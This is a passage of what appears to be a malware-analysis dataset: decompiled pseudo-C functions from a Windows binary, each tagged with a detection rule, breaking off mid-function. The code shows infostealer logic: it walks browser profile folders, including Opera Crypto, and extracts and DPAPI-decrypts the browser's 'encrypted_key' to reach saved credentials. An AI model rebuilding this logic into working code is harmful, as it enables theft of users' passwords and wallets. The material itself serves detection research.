        "decompiled_code": "\nvoid fcn.00418610(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    *(unaff_ESI + 0x30) = 0;\n    *(unaff_ESI + 8) = 0;\n    *(unaff_ESI + 0x10) = 0;\n    *(unaff_ESI + 0x14) = 0x201;\n    *(unaff_ESI + 0x18) = 6;\n    *(unaff_ESI + 0x1c) = 0;\n    *(unaff_ESI + 0x20) = 0;\n    *(unaff_ESI + 0x24) = 0;\n    *(unaff_ESI + 0x28) = 0;\n    *(unaff_ESI + 0x2c) = 0;\n    *(unaff_ESI + 0xc) = 0;\n    puVar1 = fcn.0042ddfe(4);\n    if (puVar1 != NULL) {\n        uVar2 = fcn.0042d064();\n        *puVar1 = uVar2;\n        iVar3 = fcn.0042ce23();\n        fcn.0042d14d(0);\n        if (*(iVar3 + 4) != -1) {\n            *(iVar3 + 4) = *(iVar3 + 4) + 1;\n        }\n        fcn.0042d175();\n        *(unaff_ESI + 0x30) = puVar1;\n        return;\n    }\n    *(unaff_ESI + 0x30) = 0;\n    return;\n}\n",
        "token_count": 391
    },
    "004188c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.004188c0(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *unaff_EBX;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    \n    uVar1 = 0;\n    iVar2 = (**0x4573b4)();\n    if ((iVar2 != 0) && (iVar2 != -1)) {\n        iVar3 = (**0x45736c)(iVar2, &var_14h);\n        if ((iVar3 != 0) && (var_10h == 0)) {\n            *unaff_EBX = var_14h;\n            iVar3 = (**0x4574c8)(0x40, var_14h);\n            *arg_8h = iVar3;\n            if (iVar3 != 0) {\n                uVar1 = (**0x4574dc)(iVar2, iVar3, *unaff_EBX, &var_8h, 0);\n                uVar1 = uVar1 & *unaff_EBX == var_8h;\n                if (uVar1 == 0) {\n                    (**0x4575c8)(*arg_8h);\n                }\n            }\n        }\n        (**0x4573b8)(iVar2);\n    }\n    return uVar1;\n}\n",
        "token_count": 319
    },
    "00418aa0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.00418aa0(uint arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    char *pcVar7;\n    uint in_EDX;\n    int32_t *piVar8;\n    int32_t *in_FS_OFFSET;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441588;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_30h = 0;\n    var_10h = uVar2;\n    iVar3 = fcn.004188c0(&var_38h);\n    piVar8 = var_34h;\n    iVar5 = var_38h;\n    if ((((iVar3 != 0) && (var_38h != 0)) && (var_34h != NULL)) &&\n       (puVar4 = (**0x4574c8)(0x40, var_34h + 1, uVar2),  puVar4 != NULL)) {\n        if (piVar8 != NULL) {\n            puVar6 = puVar4;\n            do {\n                *puVar6 = puVar6[iVar5 - puVar4];\n                puVar6 = puVar6 + 1;\n                piVar8 = piVar8 + -1;\n            } while (piVar8 != NULL);\n        }\n        iVar5 = (**0x4573a0)(puVar4, \"encrypted_key\");\n        if (iVar5 != 0) {\n            var_18h = 0xf;\n            var_1ch = 0;\n            var_2ch = var_2ch & 0xffffff00;\n            pcVar7 = iVar5 + 0x10;\n            do {\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            fcn.004090e0(iVar5 + 0x10, pcVar7 - (iVar5 + 0x11));\n            var_4h = 0;\n            iVar5 = fcn.004149c0(&var_2ch, 0x44efd4, 2);\n            if (iVar5 != -1) {\n                fcn.004094e0(iVar5, 0xffffffff);\n            }\n            iVar5 = fcn.00418950();\n            if ((((iVar5 != 0) && (4 < var_3ch)) &&\n                ((*var_34h == str.DPAPI._0_4_ &&\n                 ((*(var_34h + 1) == 'I' && (cVar1 = fcn.004189b0(&var_38h),  cVar1 != '\\0')))))) && (var_34h == 0x20))\n            {\n                var_30h = 1;\n                fcn.00418a20(var_38h);\n            }\n            if (0xf < var_18h) {\n                fcn.0042d62b(var_2ch);\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(in_EDX);\n    return;\n}\n",
        "token_count": 857
    },
    "0041b110": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b110(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint arg_10h_00;\n    uint *arg_14h_00;\n    uint arg_18h_00;\n    uint var_374h;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint var_364h;\n    uint var_360h;\n    uint var_35ch;\n    uint var_330h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    (**0x457374)(&fcn.0041b110::var_21ch, \"%s\\\\*\", arg_ch);\n    iVar1 = (**0x4575e0)(&fcn.0041b110::var_21ch, &fcn.0041b110::var_35ch);\n    if (iVar1 != -1) {\n        do {\n            arg_ch_00 = 0x44eba0;\n            arg_8h_00 = &fcn.0041b110::var_330h;\n            iVar2 = (**0x457550)();\n            if ((iVar2 != 0) && (iVar2 = (**0x457550)(&fcn.0041b110::var_330h, 0x44eba4),  iVar2 != 0)) {\n                (**0x457374)(&fcn.0041b110::var_114h, \"%s\\\\%s\", arg_ch, &fcn.0041b110::var_330h);\n                iVar2 = (**0x457550)(&fcn.0041b110::var_330h, *0x456f5c);\n                if (iVar2 == 0) {\n                    fcn.0041a450(&fcn.0041b110::var_114h, arg_8h);\n                    arg_ch_00 = &fcn.0041b110::var_114h;\n                    arg_8h_00 = &fcn.0041b110::var_330h;\n                    arg_10h_00 = arg_10h;\n                    arg_14h_00 = arg_14h;\n                    arg_18h_00 = arg_18h;\n                }\n                else {\n                    arg_14h_00 = &fcn.0041b110::var_330h;\n                    arg_10h_00 = 0x41b249;\n                    arg_18h_00 = *0x456a6c;\n                    iVar2 = (**0x457550)();\n                    if (iVar2 == 0) {\n                        fcn.0041aa70(&fcn.0041b110::var_114h, arg_8h);\n                    }\n                    else {\n                        iVar2 = (**0x457550)(&fcn.0041b110::var_330h, *0x4572d0);\n                        if (iVar2 == 0) {\n                            iVar2 = (**0x457330)(arg_ch);\n                            if (iVar2 == 0) {\n                                fcn.0041a1c0(arg_10h);\n                            }\n                        }\n                        else {\n                            iVar2 = (**0x457550)(&fcn.0041b110::var_330h, *0x456af0);\n                            if (iVar2 == 0) {\n                                if (*(in_ECX + 2) != '\\0') {\n                                    fcn.0041a850(arg_8h);\n                                }\n                            }\n                            else if ((var_35ch & 0x10) == 0) goto code_r0x0041b31e;\n                        }\n                    }\n                }\n                fcn.0041b110(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00, arg_18h_00);\n            }\ncode_r0x0041b31e:\n            iVar2 = (**0x457438)(iVar1, &fcn.0041b110::var_35ch);\n        } while (iVar2 != 0);\n        (**0x4573a8)(iVar1);\n    }\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 1003
    },
    "0041b360": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041b360(uint param_1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint *puVar9;\n    int32_t **in_FS_OFFSET;\n    uint var_98ch;\n    uint var_924h;\n    uint var_8dch;\n    uint var_8d8h;\n    uint var_8d4h;\n    uint var_8d0h;\n    uint var_8c8h;\n    uint var_8a8h;\n    uint var_898h;\n    uint var_894h;\n    uint var_88ch;\n    uint var_87ch;\n    uint var_878h;\n    uint var_870h;\n    uint var_860h;\n    uint var_85ch;\n    uint var_854h;\n    uint var_844h;\n    uint var_840h;\n    uint var_838h;\n    uint var_828h;\n    uint var_824h;\n    uint var_81ch;\n    uint var_80ch;\n    uint var_808h;\n    uint var_800h;\n    uint var_7f0h;\n    uint var_7ech;\n    uint var_7e4h;\n    uint var_3fch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uint uVar10;\n    uint noname_2;\n    uint32_t in_stack_fffff5a8;\n    uint in_stack_fffff5ac;\n    uint in_stack_fffff5b0;\n    uint var_98ch_2;\n    code *apcStack2344 [18];\n    uchar *puStack2272;\n    uint32_t var_8d8h_2;\n    uint uStack2264;\n    uint32_t uStack2260;\n    uint var_8cch;\n    int32_t var_8c8h_2;\n    uint var_8c4h;\n    uint32_t var_8b0h;\n    uint32_t auStack2220 [4];\n    uint uStack2204;\n    uint32_t uStack2200;\n    uint32_t uStack2192;\n    uint uStack2176;\n    uint32_t uStack2172;\n    uint32_t var_870h_2;\n    int32_t iStack2148;\n    uint32_t uStack2144;\n    uint32_t var_854h_2;\n    int32_t iStack2120;\n    uint32_t uStack2116;\n    uint *var_838h_2;\n    int32_t iStack2092;\n    uint32_t uStack2088;\n    uint *var_81ch_2;\n    int32_t var_80ch_2;\n    uint32_t var_808h_2;\n    uint *var_800h_2;\n    uint32_t var_7f0h_2;\n    uint32_t var_7ech_2;\n    uchar auStack2024 [1000];\n    uchar auStack1024 [1000];\n    uint32_t uStack24;\n    int32_t *piStack16;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x44221e;\n    piStack16 = *in_FS_OFFSET;\n    uStack24 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &piStack16;\n    uStack2264 = param_1;\n    fcn.00434d30();\n    fcn.00434d30();\n    iVar3 = (**0x457500)();\n    arg_8h = (iVar3 < 0) - 1 & auStack2024;\n    (**0x457520)();\n    (**0x457520)();\n    uVar4 = (**0x457470)();\n    if ((uVar4 != 0xffffffff) && ((uVar4 & 0x10) == 0)) {\n        fcn.00420580(&var_98ch_2, auStack1024);\n        var_4h_2._0_1_ = 0;\n        var_4h_2._1_3_ = 0;\n        var_7ech_2 = 0xf;\n        var_7f0h_2 = 0;\n        var_800h_2 = var_800h_2 & 0xffffff00;\n        var_8c8h_2 = 0;\n        uStack2116 = 0xf;\n        iStack2120 = 0;\n        var_854h_2 = var_854h_2 & 0xffffff00;\n        uStack2144 = 0xf;\n        iStack2148 = 0;\n        var_870h_2 = var_870h_2 & 0xffffff00;\n        uStack2088 = 0xf;\n        iStack2092 = 0;\n        var_838h_2 = var_838h_2 & 0xffffff00;\n        var_808h_2 = 0xf;\n        var_80ch_2 = 0;\n        var_81ch_2 = var_81ch_2 & 0xffffff00;\n        while( true ) {\n            fcn.004185d0();\n            var_4h_2._0_1_ = 6;\n            piVar5 = fcn.00421ae0();\n            uVar4 = uStack2260;\n            var_4h_2._0_1_ = 5;\n            if (uStack2260 != 0) {\n                fcn.0042d14d(0);\n                iVar3 = *(uVar4 + 4);\n                if ((iVar3 != 0) && (iVar3 != -1)) {\n                    *(uVar4 + 4) = iVar3 + -1;\n                }\n                iVar3 = *(uVar4 + 4);\n                fcn.0042d175();\n                puVar9 = ~-(iVar3 != 0) & uVar4;\n                if (puVar9 != NULL) {\n                    (***puVar9)(1);\n                }\n            }\n            uVar2 = (**(*piVar5 + 0x18))(10);\n            var_8d8h_2 = var_8d8h_2 & 0xffffff00 | uVar2;\n            piVar5 = fcn.00421e10();\n            if ((*(*piVar5 + 4) + piVar5 & ~-((*(*(*piVar5 + 4) + 0xc + piVar5) & 6) != 0)) == 0) break;\n            pcVar6 = *0x456b20;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            var_8c8h_2 = fcn.004149c0(&var_800h_2, *0x456b20, pcVar6 - (*0x456b20 + 1));\n            if (var_8c8h_2 != -1) {\n                uVar4 = 9;\n                if ((8 < var_7f0h_2) || (uVar4 = var_7f0h_2,  var_7f0h_2 != 0)) {\n                    puVar9 = var_800h_2;\n                    if (var_7ech_2 < 0x10) {\n                        puVar9 = &var_800h_2;\n                    }\n                    fcn.0042d8e0(puVar9, puVar9 + uVar4, var_7f0h_2 - uVar4);\n                    var_7f0h_2 = var_7f0h_2 - uVar4;\n                    puVar9 = var_800h_2;\n                    if (var_7ech_2 < 0x10) {\n                        puVar9 = &var_800h_2;\n                    }\n                    *(var_7f0h_2 + puVar9) = 0;\n                }\n                puVar9 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar9 = &var_800h_2;\n                }\n                puVar8 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar8 = &var_800h_2;\n                }\n                iVar3 = (var_7f0h_2 - 7) + puVar8;\n                puVar8 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar8 = &var_800h_2;\n                }\n                if (iVar3 == 0) {\n                    iVar7 = 0;\n                }\n                else {\n                    iVar7 = iVar3 - puVar8;\n                }\n                if (var_7f0h_2 + puVar9 == 0) {\n                    iVar3 = 0;\n                }\n                else {\n                    iVar3 = (var_7f0h_2 + puVar9) - iVar3;\n                }\n                fcn.004094e0(iVar7, iVar3);\n                fcn.004092e0(&var_800h_2, 0, 0xffffffff);\n            }\n            pcVar6 = *0x456e04;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            iVar3 = fcn.004149c0(&var_800h_2, *0x456e04, pcVar6 - (*0x456e04 + 1));\n            if (iVar3 != -1) {\n                uVar4 = 9;\n                if ((8 < var_7f0h_2) || (uVar4 = var_7f0h_2,  var_7f0h_2 != 0)) {\n                    puVar9 = var_800h_2;\n                    if (var_7ech_2 < 0x10) {\n                        puVar9 = &var_800h_2;\n                    }\n                    fcn.0042d8e0(puVar9, puVar9 + uVar4, var_7f0h_2 - uVar4);\n                    var_7f0h_2 = var_7f0h_2 - uVar4;\n                    puVar9 = var_800h_2;\n                    if (var_7ech_2 < 0x10) {\n                        puVar9 = &var_800h_2;\n                    }\n                    *(var_7f0h_2 + puVar9) = 0;\n                }\n                puVar9 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar9 = &var_800h_2;\n                }\n                puVar8 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar8 = &var_800h_2;\n                }\n                iVar3 = puVar8 + (var_7f0h_2 - 7);\n                puVar8 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar8 = &var_800h_2;\n                }\n                if (iVar3 == 0) {\n                    iVar7 = 0;\n                }\n                else {\n                    iVar7 = iVar3 - puVar8;\n                }\n                if (puVar9 + var_7f0h_2 == 0) {\n                    iVar3 = 0;\n                }\n                else {\n                    iVar3 = (puVar9 + var_7f0h_2) - iVar3;\n                }\n                fcn.004094e0(iVar7, iVar3);\n                fcn.004092e0(&var_800h_2, 0, 0xffffffff);\n            }\n            pcVar6 = *0x456f98;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            iVar3 = fcn.004149c0(&var_800h_2, *0x456f98, pcVar6 - (*0x456f98 + 1));\n            if (iVar3 != -1) {\n                uVar4 = 9;\n                if ((8 < var_7f0h_2) || (uVar4 = var_7f0h_2,  var_7f0h_2 != 0)) {\n                    puVar9 = var_800h_2;\n                    if (var_7ech_2 < 0x10) {\n                        puVar9 = &var_800h_2;\n                    }\n                    fcn.0042d8e0(puVar9, puVar9 + uVar4, var_7f0h_2 - uVar4);\n                    var_7f0h_2 = var_7f0h_2 - uVar4;\n                    puVar9 = var_800h_2;\n                    if (var_7ech_2 < 0x10) {\n                        puVar9 = &var_800h_2;\n                    }\n                    *(var_7f0h_2 + puVar9) = 0;\n                }\n                puVar9 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar9 = &var_800h_2;\n                }\n                puVar8 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar8 = &var_800h_2;\n                }\n                iVar3 = puVar8 + (var_7f0h_2 - 7);\n                puVar8 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar8 = &var_800h_2;\n                }\n                if (iVar3 == 0) {\n                    iVar7 = 0;\n                }\n                else {\n                    iVar7 = iVar3 - puVar8;\n                }\n                if (puVar9 + var_7f0h_2 == 0) {\n                    iVar3 = 0;\n                }\n                else {\n                    iVar3 = (puVar9 + var_7f0h_2) - iVar3;\n                }\n                fcn.004094e0(iVar7, iVar3);\n                fcn.004092e0(&var_800h_2, 0, 0xffffffff);\n            }\n            pcVar6 = *0x456fdc;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            var_8c8h_2 = fcn.004149c0(&var_800h_2, *0x456fdc, pcVar6 - (*0x456fdc + 1));\n            if (var_8c8h_2 != -1) {\n                uVar4 = 0x1b;\n                if ((0x1a < var_7f0h_2) || (uVar4 = var_7f0h_2,  var_7f0h_2 != 0)) {\n                    puVar9 = var_800h_2;\n                    if (var_7ech_2 < 0x10) {\n                        puVar9 = &var_800h_2;\n                    }\n                    fcn.0042d8e0(puVar9, puVar9 + uVar4, var_7f0h_2 - uVar4);\n                    var_7f0h_2 = var_7f0h_2 - uVar4;\n                    puVar9 = var_800h_2;\n                    if (var_7ech_2 < 0x10) {\n                        puVar9 = &var_800h_2;\n                    }\n                    *(puVar9 + var_7f0h_2) = 0;\n                }\n                puVar9 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar9 = &var_800h_2;\n                }\n                puVar8 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar8 = &var_800h_2;\n                }\n                iVar3 = puVar8 + (var_7f0h_2 - 7);\n                puVar8 = var_800h_2;\n                if (var_7ech_2 < 0x10) {\n                    puVar8 = &var_800h_2;\n                }\n                if (iVar3 == 0) {\n                    iVar7 = 0;\n                }\n                else {\n                    iVar7 = iVar3 - puVar8;\n                }\n                if (puVar9 + var_7f0h_2 == 0) {\n                    iVar3 = 0;\n                }\n                else {\n                    iVar3 = (puVar9 + var_7f0h_2) - iVar3;\n                }\n                fcn.004094e0(iVar7, iVar3);\n                puStack2272 = &stack0xfffff5a8;\n                noname_2 = 0xffffffff;\n                uVar10 = 0;\n                puVar9 = &var_800h_2;\n                in_stack_fffff5a8 = in_stack_fffff5a8 & 0xffffff00;\n                fcn.004092e0(puVar9, 0, 0xffffffff);\n                piVar5 = fcn.00423b70(puVar9, uVar10, noname_2, in_stack_fffff5a8, in_stack_fffff5ac, in_stack_fffff5b0)\n                ;\n                if (&var_81ch_2 != piVar5) {\n                    if (0xf < var_808h_2) {\n                        fcn.0042d62b(var_81ch_2);\n                    }\n                    var_808h_2 = 0xf;\n                    var_80ch_2 = 0;\n                    var_81ch_2 = var_81ch_2 & 0xffffff00;\n                    if (piVar5[5] < 0x10) {\n                        fcn.0042d8e0(&var_81ch_2, piVar5, piVar5[4] + 1);\n                    }\n                    else {\n                        var_81ch_2 = *piVar5;\n                        *piVar5 = 0;\n                    }\n                    var_80ch_2 = piVar5[4];\n                    var_808h_2 = piVar5[5];\n                    piVar5[4] = 0;\n                    piVar5[5] = 0;\n                }\n                var_4h_2._0_1_ = 5;\n                if (0xf < var_8b0h) {\n                    fcn.0042d62b(var_8c4h);\n                }\n            }\n            iVar3 = fcn.0040e640();\n            if ((((iVar3 != 0 || iStack2120 != 0) && (iVar3 = fcn.0040e640(),  iVar3 != 0 || iStack2148 != 0)) &&\n                (iVar3 = fcn.0040e640(),  iVar3 != 0 || iStack2092 != 0)) &&\n               (iVar3 = fcn.0040e640(),  uVar10 = uStack2264,  iVar3 != 0 || var_80ch_2 != 0)) {\n                (**0x457520)(uStack2264, *0x457228);\n                (**0x457520)(uVar10, *0x4571e0);\n                fcn.00414be0(auStack2220, &var_854h_2, 0x44ebe0);\n                var_4h_2._0_1_ = 8;\n                puVar9 = fcn.00417500();\n                var_4h_2 = CONCAT31(var_4h_2._1_3_, 9);\n                if (0xf < puVar9[5]) {\n                    puVar9 = *puVar9;\n                }\n                (**0x457520)(uVar10, puVar9);\n                if (0xf < uStack2172) {\n                    fcn.0042d62b(uStack2192);\n                }\n                var_4h_2._0_1_ = 5;\n                uStack2172 = 0xf;\n                uStack2176 = 0;\n                uStack2192 = uStack2192 & 0xffffff00;\n                if (0xf < uStack2200) {\n                    fcn.0042d62b(auStack2220[0]);\n                }\n                uStack2200 = 0xf;\n                uStack2204 = 0;\n                auStack2220[0] = auStack2220[0] & 0xffffff00;\n                (**0x457520)(uVar10, 0x44c738);\n                (**0x457520)(uVar10, *0x456c9c);\n                puVar9 = var_838h_2;\n                if (uStack2088 < 0x10) {\n                    puVar9 = &var_838h_2;\n                }\n                (**0x457520)(uVar10, puVar9);\n                (**0x457520)(uVar10, 0x44c738);\n                (**0x457520)(uVar10, *0x45719c);\n                puVar9 = var_81ch_2;\n                if (var_808h_2 < 0x10) {\n                    puVar9 = &var_81ch_2;\n                }\n                (**0x457520)(uVar10, puVar9);\n                (**0x457520)(uVar10, 0x44ed2c);\n                fcn.004090e0(0x44c726, 0);\n                in_stack_fffff5b0 = 0;\n                in_stack_fffff5ac = 0x44c726;\n                fcn.004090e0(0x44c726, 0);\n                in_stack_fffff5a8 = 0;\n                fcn.004090e0(0x44c726, 0);\n                fcn.004090e0(0x44c726, 0);\n                *0x45732c = *0x45732c + 1;\n            }\n        }\n        if (0xf < var_808h_2) {\n            fcn.0042d62b();\n        }\n        var_808h_2 = 0xf;\n        var_80ch_2 = 0;\n        var_81ch_2 = var_81ch_2 & 0xffffff00;\n        if (0xf < uStack2088) {\n            fcn.0042d62b();\n        }\n        uStack2088 = 0xf;\n        iStack2092 = 0;\n        var_838h_2 = var_838h_2 & 0xffffff00;\n        if (0xf < uStack2144) {\n            fcn.0042d62b();\n        }\n        uStack2144 = 0xf;\n        iStack2148 = 0;\n        var_870h_2 = var_870h_2 & 0xffffff00;\n        if (0xf < uStack2116) {\n            fcn.0042d62b();\n        }\n        uStack2116 = 0xf;\n        iStack2120 = 0;\n        var_854h_2 = var_854h_2 & 0xffffff00;\n        if (0xf < var_7ech_2) {\n            fcn.0042d62b();\n        }\n        var_7ech_2 = 0xf;\n        var_7f0h_2 = 0;\n        var_800h_2 = var_800h_2 & 0xffffff00;\n        var_4h_2 = 0xffffffff;\n        fcn.004206f0();\n        apcStack2344[0] = vtable.std::ios_base.0;\n        fcn.0042cd59(apcStack2344);\n    }\n    *in_FS_OFFSET = piStack16;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 5506
    },
    "0041ea70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ecf6)\n// WARNING: Removing unreachable block (ram,0x0041ec77)\n// WARNING: Removing unreachable block (ram,0x0041ec8f)\n// WARNING: Removing unreachable block (ram,0x0041ed0e)\n\nvoid __cdecl fcn.0041ea70(uint arg_8h)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint in_ECX;\n    int32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_654h;\n    uint var_650h;\n    uint var_64ch;\n    uint var_648h;\n    uint32_t var_644h;\n    uint var_634h;\n    uint32_t var_630h;\n    uint32_t var_628h;\n    uint var_618h;\n    uint32_t var_614h;\n    uint var_60ch;\n    uint var_224h;\n    uint var_11ch;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4438ab;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00434d30(&var_224h, 0, 0x104, var_14h);\n    fcn.00434d30(&var_60ch, 0, 1000);\n    iVar3 = (**0x457500)(0, 0x1c, 0, 0, &var_60ch);\n    (**0x457520)(&var_224h, &var_60ch & (iVar3 < 0) - 1);\n    (**0x457520)(&var_224h);\n    fcn.00434d30(&var_11ch, 0, 0x104);\n    (**0x457520)(&var_11ch, &var_224h);\n    (**0x457520)(&var_11ch, 0x44c8cc);\n    (**0x457520)(&var_11ch, *0x456d54);\n    puVar4 = &var_11ch;\n    var_614h = 0xf;\n    var_618h = 0;\n    var_628h = var_628h & 0xffffff00;\n    do {\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(&var_11ch, puVar4 - (&var_11ch + 1));\n    var_4h = 0;\n    puVar4 = fcn.00424130(&var_644h);\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    uVar5 = (**0x457364)(puVar4);\n    if ((uVar5 == 0xffffffff) || ((uVar5 & 0x10) != 0)) {\n        bVar2 = false;\n    }\n    else {\n        bVar2 = true;\n    }\n    if (7 < var_630h) {\n        fcn.0042d62b(var_644h);\n    }\n    var_4h = 0xffffffff;\n    var_630h = 7;\n    var_634h = 0;\n    var_644h = var_644h & 0xffff0000;\n    if (0xf < var_614h) {\n        fcn.0042d62b(var_628h);\n    }\n    var_614h = 0xf;\n    var_618h = 0;\n    var_628h = var_628h & 0xffffff00;\n    if (bVar2) {\n        fcn.00418aa0(&var_11ch);\n    }\n    puVar4 = &var_224h;\n    fcn.0041acd0(0x44c726, puVar4, arg_8h, 0, 0, *(unaff_EDI + 0x20), in_ECX, 0);\n    if (*(unaff_EDI + 6) != '\\0') {\n        fcn.0041e150(unaff_EDI, 0);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(puVar4);\n    return;\n}\n",
        "token_count": 1034
    },
    "0041ed40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041f0b6)\n// WARNING: Removing unreachable block (ram,0x0041f028)\n// WARNING: Removing unreachable block (ram,0x0041f040)\n// WARNING: Removing unreachable block (ram,0x0041f0ce)\n\nvoid __cdecl fcn.0041ed40(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint in_ECX;\n    uint in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint var_764h;\n    uint var_760h;\n    uint var_75ch;\n    uint32_t var_758h;\n    uint var_754h;\n    uint var_750h;\n    uint32_t var_74ch;\n    uint var_73ch;\n    uint32_t var_738h;\n    uint32_t var_730h;\n    uint var_720h;\n    uint32_t var_71ch;\n    uint var_714h;\n    uint var_32ch;\n    uint var_224h;\n    uint var_11ch;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x44386b;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar3 = *0x457068;\n    fcn.00434d30(&var_224h, 0, 0x104, var_14h);\n    fcn.00434d30(&var_32ch, 0, 0x104);\n    fcn.00434d30(&var_714h, 0, 1000);\n    iVar4 = (**0x457500)(0, 0x1a, 0, 0, &var_714h);\n    (**0x457520)(&var_224h, (iVar4 < 0) - 1 & &var_714h);\n    (**0x457520)(&var_224h, uVar3);\n    (**0x457520)(&var_224h, arg_ch);\n    iVar4 = (**0x457550)(arg_ch, *0x4570a0);\n    var_758h = iVar4 == 0;\n    iVar4 = (**0x457550)(arg_ch, *0x456b00);\n    if (iVar4 == 0) {\n        var_758h = 2;\n    }\n    iVar4 = (**0x457550)(arg_ch, \"Opera Crypto Stable\");\n    if (iVar4 == 0) {\n        var_758h = 3;\n    }\n    fcn.00434d30(&var_714h, 0, 1000);\n    iVar4 = (**0x457500)(0, 0x1a, 0, 0, &var_714h);\n    (**0x457520)(&var_32ch, (iVar4 < 0) - 1 & &var_714h);\n    (**0x457520)(&var_32ch, uVar3);\n    fcn.00434d30(&var_11ch, 0, 0x104);\n    (**0x457520)(&var_11ch, &var_224h);\n    (**0x457520)(&var_11ch, 0x44c8cc);\n    (**0x457520)(&var_11ch, *0x456d54);\n    puVar5 = &var_11ch;\n    var_71ch = 0xf;\n    var_720h = 0;\n    var_730h = var_730h & 